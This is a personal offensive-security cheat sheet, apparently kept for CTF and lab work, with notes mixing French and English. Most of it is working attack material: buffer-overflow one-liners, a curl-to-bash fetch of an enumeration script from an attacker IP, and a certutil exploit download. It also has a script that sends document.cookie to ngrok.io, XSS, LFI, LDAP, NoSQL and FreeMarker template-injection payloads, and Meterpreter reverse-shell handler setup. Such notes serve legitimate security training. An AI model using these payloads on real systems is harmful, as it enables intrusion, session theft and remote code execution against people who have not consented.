# FISHINGIG
- goldfish 

# FORENSIC

tsurugi lab

# REGGEX SUBLIME

- ()      => cree un bloc ($1)
- []      => les caracteres a chercher sont a l'interieur
- \*       => en boucle minimum 0
- \+       => en boucle minimum 1
- ^       => tant qu'on a pas (carac suivant)
- .+      => tout tant qu'on a pas de newline

examples :
        (pub fn) ([a-z_]*)([^:\n]+):([a-zA-Z-]+)([ u0-9]*) .+

# GDB

| code      | Function                          |
|-----------| ----------------------------------|
|P      | Function address |
|si     | next instruction |
|finish | End current function |

x/(?1)wx (?2) => print (?2) le nombre de cases memoires suivant l'instruction (?2)

examples :
print les 30 cases memoires suivantes de $esp
* x/30wx $esp

cat send standard entry into the pipe
* (perl -e 'print "A"x128 . "wathever"' ; cat) | ./ch15

Other implementation for x64 in Python to write the address in little endian 
- { python -c 'from struct import pack ; print "B"*280 + pack ("<Q", 0x4005e7)' ; cat' } | ./ch35

x86 chr() to write hexa
 - (python -c 'print chr(0x08)*4 + "\xbc\xfa\xff\xbf"' ; cat ) | ./ch16

examples:
```
{ python -c 'from struct import pack; print "B" * 280 + pack("<Q", 0x400556)'; cat } | ./binaire 
```
```
( python -c 'print chr(0x08)*4 + "\xbc\xfa\xff\xbf"' ; cat) | binaire
```

# REVERSE SHELL
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
```

# BASH

--noprofile
Do  not  read  either  the system-wide startup file /etc/profile or any of the personal
initialization files ~/.bash_profile, ~/.bash_login, or ~/.profile.  By  default,  bash
reads these files when it is invoked as a login shell (see INVOCATION below).

--norc 
Do  not  read  and execute the system wide initialization file /etc/bash.bashrc and the
personal initialization file ~/.bashrc if the shell is interactive.  This option is  on 
by default if the shell is invoked as sh.

# PRIVESC

### LINUX
Get proper TTY shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
or 
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=screen
ctrl + z 
stty raw -echo; fg
```

Create simple http server
```
python3 -m http.server
```

Curl a file and pipe it to bash
```
curl 10.10.14.249:9999/LinEnum.sh | bash
```
wget a file 
```
wget -O LinEnum.sh 10.10.14.249:9999
```
List processes
```
ps auxwww
```
Binaries capabilities
```
getcap -r / 2>/dev/null
```
Analyze file
```
file "yolo"
```
Find SUID files
```
find / -perm -4000 -exec ls -l {} \; 2>/dev/null
```
Start a bash without a profile
```
sh -i /home/nobody/.ssh/ssh_key USER@IP -t bash --noprofile --norci  
```                                                                 
### WINDOWS

Download file PowerShell
```
certutil -urlcache -f http://10.10.14.28:8000/41020.exe 41020.exe
```
# CRYPTO
```
cat file | 
```
Decode openssl -salted
```
bruteforce-salted-openssl -t 6 -f ~/Téléchargements/rockyou.txt -c AES-256-CBC -d SHA256 decoded_drupal.txt -1
```
Encode openssl
```
openssl enc -in LEFICHIERDENTREE -out LEFICHIERDESORTIE -d -AES-256-CBC -md sha256 -pass 'pass:LEPASSQUETATROUVE'
```

# XSS
```
'onfocus="alert(1)"autofocus='
```

# LFI 

```
index.php?file=php://filter/convert.base64-encode/resource=config # will append ".php" at the end
```

## NGROK

```
<script>window.location.href='http://ngrok.io/?cookie='%2bdocument.cookie</script>
```

# METERPRETER

Handle connexions
```
use exploit/multi/handler
```
Windows handler
```
set payload windows/meterpreter/reverse_tcp
```
Interact with sessions
```
sessions -i 1                                   
```
background the meterpreter so we can use other tools
```
ctrl + z
```

windows exploit suggester (session number need to be added to the options)
```
use post/multi/recon/local_exploit_suggester
```


# DIVERS
```
socat tcp-listen:2222, fork tcp 192.168.100.12:22
```

LDAP injection tester username avec ) si error
```
username=* pass=*)(& 
```
### nosql
Regex to use until you have the good size then inser chars before the '.' who means "Everything"
```
NOSQL usr_name[$ne]=h4cker&usr_password[$ne]=abc [$ne] == OK
NOSQL usr_name[$regex]=.{1}&usr_password[$ne]=abc 
```

## template injection 
```
https://portswigger.net/blog/server-side-template-injection 
```
```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat SECRET_FLAG.txt") }
```
